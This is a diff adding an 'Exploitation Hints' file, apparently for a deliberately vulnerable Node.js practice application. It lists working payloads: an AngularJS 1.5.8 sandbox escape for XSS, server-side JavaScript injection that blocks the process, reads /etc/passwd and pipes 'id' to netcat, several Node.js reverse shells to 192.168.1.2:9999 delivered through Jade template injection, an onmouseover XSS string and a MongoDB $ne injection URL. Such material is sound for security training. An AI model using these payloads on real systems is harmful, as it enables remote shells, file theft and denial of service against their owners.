@@ -1,0 +1,107 @@
+Exploitation Hints
+
+XSS
+
+The following payload will break the AngularJS sandbox with AngularJS 1.5.8
+
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+
+SSJI
+
+1. A blocking nodejs delay can be achieved by using the following:
+
+    var start=new Date().getTime() ;while (new Date().getTime() < start + 5000);
+
+    BE CAUTIOUS!! Can cause Denial of Service as you are effectively blocking the process
+
+2. Files can be read with the following payload:
+
+      res.end(require('fs').readFileSync('/etc/passwd').toString())
+
+3. Command shell
+
+   Can verify using netcat (ensure IP and ports are correct):
+
+   $ nc -nlv 9999
+
+   root.process.mainModule.require('child_process').exec('id | nc 192.168.1.2 9999')
+
+    (function(){
+      var net = require("net"),
+          cp = require("child_process"),
+          sh = cp.spawn("/bin/sh", []);
+      var client = new net.Socket();
+      client.connect(9999, "192.168.1.2", function(){
+          client.pipe(sh.stdin);
+          sh.stdout.pipe(client);
+          sh.stderr.pipe(client);
+      });
+      return /a/;
+    })();
+
+  Reverse shell from here: https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
+
+SSTI Example 1
+
+1. Verify vulnerable using something like the following:
+
+  = 7*7
+
+2. Reading /etc/passwd can be done this way:
+
+- var d = root.process.mainModule.require('fs').readFileSync('/etc/passwd').toString();
+div #{d}
+
+3. Reverse Shell
+
+For Jade, we need to define the function and then execute it server side:
+
+function a(){
+  var x = root.process.mainModule.require
+  var net = x("net"), cp = x("child_process"), sh = cp.spawn("/bin/sh", []);
+  var client = new net.Socket();
+  client.connect(9999, "192.168.1.2", function(){
+      client.pipe(sh.stdin);
+      sh.stdout.pipe(client);
+      sh.stderr.pipe(client);
+  });
+  return /a/;
+}
+
+Drop in payload:
+
+- function a(){var x = root.process.mainModule.require;var net = x("net"), cp = x("child_process"), sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(9999, "192.168.1.2", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}
+= a()
+
+
+SSTI Example 2
+
+1. XSS Payload
+
+  #[a(href="" onmouseover="javascript:alert(42);") alert]
+
+2. Yes, we can still get a shell using the following expression syntax:
+
+  #{ JS Reverse Shell Function }
+
+  We can use the same code from SSTI example 1, but we need to make it a self executing anonmymous function:
+
+    #{
+      (function() {   
+        var x = root.process.mainModule.require;
+        var net = x("net"),cp = x("child_process"), sh = cp.spawn("/bin/sh", []);
+        var client = new net.Socket();
+        client.connect(9999, "192.168.1.2", function(){
+          client.pipe(sh.stdin);
+          sh.stdout.pipe(client);
+          sh.stderr.pipe(client);
+         })
+       })()
+      }
+
+
+MongoDB Injection
+
+1. All users can be returned via the following injection:
+
+    http://localhost:3000/mongodb?query[$ne]=''
